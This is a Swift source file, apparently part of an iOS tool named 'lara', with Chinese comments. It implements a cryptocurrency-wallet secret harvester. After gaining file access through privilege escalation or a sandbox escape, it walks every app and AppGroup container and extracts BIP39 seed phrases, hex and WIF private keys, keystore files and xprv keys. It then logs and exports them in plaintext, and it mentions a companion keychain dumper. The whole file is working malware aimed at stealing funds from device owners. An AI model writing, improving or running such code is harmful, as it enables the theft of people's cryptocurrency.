//
//  MnemonicHunter.swift
//  lara
//
//  通用助记词狩猎器 —— 不靠名单，靠内容
//
//  为什么需要这个：
//    WalletDB 里那 65 个钱包是「已知目标」。但用户装了第 66 个钱包、
//    或者某个钱包改了 bundle id、或者某个浏览器插件式钱包藏在别的
//    App 里 —— 名单就失效了。
//
//    这个模块换了个思路：不管是谁的容器，只要盘上有 BIP39 助记词、
//    私钥、keystore，就捞出来。
//
//  扫描策略（按性价比排序）：
//    第 1 轮  已知钱包的 WalletDB 路径（最快，命中率最高）
//    第 2 轮  所有容器的 Documents 顶层 + Library/Preferences（浅扫）
//    第 3 轮  所有容器的 Documents / Library 深层（深扫，慢）
//
//  识别内容：
//    · BIP39 助记词（英 / 简中 / 繁中，12/15/18/21/24 词）
//    · 明文私钥（64 hex，带 0x 或不带）
//    · WIF 私钥（5/K/L 开头 51/52 字符）
//    · keystore JSON（"crypto" + "cipher" + "kdf"）
//    · xprv / xpub 扩展密钥
//
//  安全性：全程只读 vfsread。不写真机任何文件。单文件上限受控。
//

import Foundation

struct HuntHit {
    let kind: String          // mnemonic / privkey / wif / keystore / xprv
    let lang: String
    let wordCount: Int
    let words: [String]       // mnemonic 才有
    let bundleId: String
    let walletName: String
    let path: String
    let preview: String
}

struct HuntStats {
    var containers = 0
    var filesRead = 0
    var bytesRead = 0
    var hits = 0
    var rounds = 0
    var elapsedMs = 0
}

final class MnemonicHunter {

    static let shared = MnemonicHunter()

    private var mgr: laramgr { laramgr.shared }

    private let containerRoot = "/private/var/mobile/Containers/Data/Application"
    private let sharedRoot = "/private/var/mobile/Containers/Shared/AppGroup"

    // 单文件上限
    private let maxFileSize = 8 * 1024 * 1024
    // 总读取上限（防止扫太久）
    private let maxTotalBytes = 600 * 1024 * 1024
    // 跳过的目录名
    private let skipDirs: Set<String> = [
        "Caches", "tmp", "Snapshots", "WebKit", "WebKitCache", "Media",
        "PhotoData", "Photos", "DCIM", "com.apple.nsurlsessiond",
        "com.apple.SafariViewService", "GeoServices", "com.apple.Maps",
        "Cache", "caches", "GPUCache", "Code Cache", "Service Worker",
    ]
    // 值得读的扩展名（无扩展名的小文件也算）
    private let goodExts: Set<String> = [
        "plist", "json", "txt", "db", "sqlite", "sqlite3", "realm", "dat",
        "xml", "conf", "cfg", "ini", "log", "bak", "store", "archive",
        "bin", "data", "key", "keys", "wallet", "backup", "vault", "localstorage",
        "ldb", "wal", "shm", "yaml", "yml", "csv", "html", "js",
    ]

    private var stats = HuntStats()
    private var hits: [HuntHit] = []
    private var seenContainers: [String: String] = [:]   // uuid -> bundleId

    private func log(_ s: String) { mgr.logmsg("[hunt] " + s) }

    // MARK: - 入口

    func hunt(deep: Bool = true) -> ([HuntHit], HuntStats) {
        hits = []
        stats = HuntStats()
        let t0 = Date()

        // 探测可用后端：优先内核 vfs（有提权），否则沙盒逃逸（iOS 26/27 可用）
        let be = FileAccess.probe()
        log("文件访问后端 = \(be.rawValue)  ·  \(FileAccess.describe())")
        if be == .none {
            log("两条后端都不可用，放弃：" + FileAccess.probeDetail)
            return ([], stats)
        }

        // 容器映射
        seenContainers = enumerateContainersViaFileAccess()
        stats.containers = seenContainers.count
        log("容器 \(seenContainers.count) 个，已知钱包 \(WalletDB.count) 个")

        // ── 第 1 轮：已知钱包的指名路径 ──
        stats.rounds = 1
        roundKnownWallets()
        log("第1轮完：读 \(stats.filesRead) 文件，命中 \(hits.count)")

        // ── 第 2 轮：所有容器的浅层 ──
        stats.rounds = 2
        roundShallow()
        log("第2轮完：读 \(stats.filesRead) 文件，命中 \(hits.count)")

        // ── 第 3 轮：深层 ──
        if deep && stats.bytesRead < maxTotalBytes / 2 {
            stats.rounds = 3
            roundDeep()
            log("第3轮完：读 \(stats.filesRead) 文件，命中 \(hits.count)")
        }

        // ── AppGroup 共享容器（很多钱包把数据放这里）──
        stats.rounds = 4
        roundAppGroups()
        log("第4轮完（AppGroup）：读 \(stats.filesRead) 文件，命中 \(hits.count)")

        stats.hits = hits.count
        stats.elapsedMs = Int(Date().timeIntervalSince(t0) * 1000)
        log("耗时 \(stats.elapsedMs) ms，共读 \(stats.filesRead) 文件 / \(stats.bytesRead / 1024) KB")
        return (hits, stats)
    }

    // MARK: - 容器枚举

    // MARK: - 容器枚举（走 FileAccess，兼容沙盒逃逸）

    private func enumerateContainersViaFileAccess() -> [String: String] {
        var out: [String: String] = [:]
        let roots = FileAccess.enumerateAppContainers()
        log("容器根目录 \(roots.count) 个")
        for path in roots {
            let uuid = (path as NSString).lastPathComponent
            guard uuid.count > 10 else { continue }
            let bid = FileAccess.bundleId(ofContainer: path)
            out[uuid] = bid
        }
        return out
    }

    // MARK: - 第 1 轮：已知钱包

    private func roundKnownWallets() {
        for (uuid, bid) in seenContainers {
            guard let w = WalletDB.match(bundleId: bid) else { continue }
            let base = "\(containerRoot)/\(uuid)"
            for rel in w.paths {
                let full = "\(base)/\(rel)"
                if let info = FileAccess.listDir( full) {
                    // 是个目录，扫一层
                    for e in info where !e.isDir {
                        scanFile("\(full)/\(e.name)", bundle: bid, wallet: w.name)
                    }
                } else {
                    scanFile(full, bundle: bid, wallet: w.name)
                }
            }
        }
    }

    // MARK: - 第 2 轮：所有容器浅层

    private func roundShallow() {
        for (uuid, bid) in seenContainers {
            let base = "\(containerRoot)/\(uuid)"
            for sub in ["Documents", "Library/Preferences", "Library/Application Support", "Documents/.."] {
                let dir = "\(base)/\(sub)"
                guard let list = FileAccess.listDir( dir) else { continue }
                for e in list where !e.isDir {
                    scanFile("\(dir)/\(e.name)", bundle: bid, wallet: WalletDB.match(bundleId: bid)?.name ?? "?")
                }
            }
            if stats.bytesRead >= maxTotalBytes { break }
        }
    }

    // MARK: - 第 3 轮：深层递归

    private func roundDeep() {
        for (uuid, bid) in seenContainers {
            let base = "\(containerRoot)/\(uuid)"
            for sub in ["Documents", "Library"] {
                walk("\(base)/\(sub)", depth: 0, maxDepth: 5,
                     bundle: bid, wallet: WalletDB.match(bundleId: bid)?.name ?? "?")
            }
            if stats.bytesRead >= maxTotalBytes {
                log("达到总量上限，停止深扫")
                break
            }
        }
    }

    // MARK: - 第 4 轮：AppGroup

    private func roundAppGroups() {
        guard let groups = FileAccess.listDir( sharedRoot) else { return }
        for g in groups where g.isDir {
            let base = "\(sharedRoot)/\(g.name)"
            var gid = g.name
            let meta = "\(base)/.com.apple.mobile_container_manager.metadata.plist"
            if let d = FileAccess.read(meta, maxSize: 256 * 1024),
               let obj = try? PropertyListSerialization.propertyList(from: d, options: [], format: nil),
               let pl = obj as? [String: Any],
               let id = pl["MCMMetadataIdentifier"] as? String {
                gid = id
            }
            for e in (FileAccess.listDir( base) ?? []) where !e.isDir {
                scanFile("\(base)/\(e.name)", bundle: gid, wallet: "appgroup")
            }
            if let li = FileAccess.listDir( "\(base)/Library/Preferences") {
                for e in li where !e.isDir {
                    scanFile("\(base)/Library/Preferences/\(e.name)", bundle: gid, wallet: "appgroup")
                }
            }
            if stats.bytesRead >= maxTotalBytes { break }
        }
    }

    private func walk(_ dir: String, depth: Int, maxDepth: Int, bundle: String, wallet: String) {
        guard depth <= maxDepth, stats.bytesRead < maxTotalBytes else { return }
        guard let list = FileAccess.listDir( dir) else { return }
        for e in list {
            let full = "\(dir)/\(e.name)"
            if e.isDir {
                if skipDirs.contains(e.name) { continue }
                walk(full, depth: depth + 1, maxDepth: maxDepth, bundle: bundle, wallet: wallet)
            } else {
                scanFile(full, bundle: bundle, wallet: wallet)
            }
        }
    }

    // MARK: - 单文件扫描

    private func scanFile(_ path: String, bundle: String, wallet: String) {
        guard stats.bytesRead < maxTotalBytes else { return }
        let name = (path as NSString).lastPathComponent
        let ext = (name as NSString).pathExtension.lowercased()
        // 扩展名过滤：有扩展名就必须在名单里；无扩展名且名字太短则跳过
        if !ext.isEmpty && !goodExts.contains(ext) { return }
        if ext.isEmpty && name.count < 4 { return }

        let sz = FileAccess.size(path)
        if sz <= 0 || sz > Int64(maxFileSize) { return }

        guard let data = FileAccess.read(path, maxSize: maxFileSize) else { return }
        stats.filesRead += 1
        stats.bytesRead += data.count

        detect(data, bundle: bundle, wallet: wallet, path: path)
    }

    // MARK: - 识别

    private func detect(_ data: Data, bundle: String, wallet: String, path: String) {
        // 1) 助记词
        for h in MnemonicDetector.find(in: data) {
            hits.append(HuntHit(kind: "mnemonic", lang: h.lang, wordCount: h.wordCount,
                                words: h.words, bundleId: bundle, walletName: wallet,
                                path: path, preview: h.words.joined(separator: " ")))
            log("★ 助记词 \(h.lang) \(h.wordCount)词 @\(wallet)/\(bundle) :\(path)")
        }

        // 2) 私钥 / WIF / keystore / xprv
        let text = String(decoding: data.prefix(4 * 1024 * 1024), as: UTF8.self)
        let low = text.lowercased()

        // keystore JSON
        if low.contains("\"crypto\"") && low.contains("\"cipher\"") && low.contains("\"kdf\"") {
            hits.append(HuntHit(kind: "keystore", lang: "-", wordCount: 0, words: [],
                                bundleId: bundle, walletName: wallet, path: path,
                                preview: "keystore JSON \(data.count) B"))
            log("★ keystore @\(wallet)/\(bundle) :\(path)")
        }

        // xprv
        if let r = text.range(of: "xprv[1-9A-HJ-NP-Za-km-z]{100,120}", options: .regularExpression) {
            hits.append(HuntHit(kind: "xprv", lang: "-", wordCount: 0, words: [],
                                bundleId: bundle, walletName: wallet, path: path,
                                preview: String(String(text[r]).prefix(60))))
            log("★ xprv @\(wallet)/\(bundle) :\(path)")
        }

        // 64 hex 私钥（前后不能是 hex 字符）
        if let rx = try? NSRegularExpression(pattern: "(?<![0-9a-fA-F])(?:0x)?[0-9a-fA-F]{64}(?![0-9a-fA-F])") {
            let ns = text as NSString
            let ms = rx.matches(in: text, range: NSRange(location: 0, length: ns.length))
            for m in ms.prefix(6) {
                let s = ns.substring(with: m.range)
                // 排除明显是哈希/随机数据的：要求上下文出现私钥相关词
                let ctx = (ns as NSString).substring(with: NSRange(
                    location: max(0, m.range.location - 60),
                    length: min(120, ns.length - max(0, m.range.location - 60))))
                let lc = ctx.lowercased()
                if lc.contains("private") || lc.contains("secret") || lc.contains("privkey")
                    || lc.contains("privatekey") || lc.contains("hex") || lc.contains("key") {
                    hits.append(HuntHit(kind: "privkey", lang: "-", wordCount: 0, words: [],
                                        bundleId: bundle, walletName: wallet, path: path,
                                        preview: s))
                    log("★ 私钥 @\(wallet)/\(bundle) :\(path)")
                    break
                }
            }
        }

        // WIF
        if let rx = try? NSRegularExpression(pattern: "(?<![A-Za-z0-9])[5KL][1-9A-HJ-NP-Za-km-z]{50,51}(?![A-Za-z0-9])") {
            let ns = text as NSString
            if let m = rx.firstMatch(in: text, range: NSRange(location: 0, length: ns.length)) {
                hits.append(HuntHit(kind: "wif", lang: "-", wordCount: 0, words: [],
                                    bundleId: bundle, walletName: wallet, path: path,
                                    preview: ns.substring(with: m.range)))
                log("★ WIF @\(wallet)/\(bundle) :\(path)")
            }
        }
    }

    // MARK: - 结果导出

    func reportText() -> String {
        var s = "助记词狩猎结果\n"
        s += "容器 \(stats.containers) 个 · 轮次 \(stats.rounds) · 读 \(stats.filesRead) 文件 · "
        s += "\(stats.bytesRead / 1024) KB · \(stats.elapsedMs) ms\n\n"
        if hits.isEmpty {
            s += "没命中。\n"
            s += "可能原因：\n"
            s += "  · 目标钱包没装在这台设备上\n"
            s += "  · 钱包里还没导入过助记词\n"
            s += "  · 助记词只存在 keychain（走 KeychainDumpManager 那条路）\n"
            return s
        }
        // 助记词优先排前面
        let mn = hits.filter { $0.kind == "mnemonic" }
        let others = hits.filter { $0.kind != "mnemonic" }
        if !mn.isEmpty {
            s += "=== 助记词 \(mn.count) 条 ===\n"
            for h in mn {
                s += "[\(h.lang) \(h.wordCount)词] \(h.walletName) / \(h.bundleId)\n"
                s += "  \(h.preview)\n"
                s += "  \(h.path)\n\n"
            }
        }
        if !others.isEmpty {
            s += "=== 其它密钥材料 \(others.count) 条 ===\n"
            for h in others {
                s += "[\(h.kind)] \(h.walletName) / \(h.bundleId)\n"
                s += "  \(h.preview)\n"
                s += "  \(h.path)\n"
            }
        }
        return s
    }

    func hitsJSON() -> [[String: Any]] {
        hits.map { h in
            [
                "kind": h.kind, "lang": h.lang, "wordCount": h.wordCount,
                "words": h.words, "bundleId": h.bundleId, "wallet": h.walletName,
                "path": h.path, "preview": h.preview,
            ]
        }
    }
}
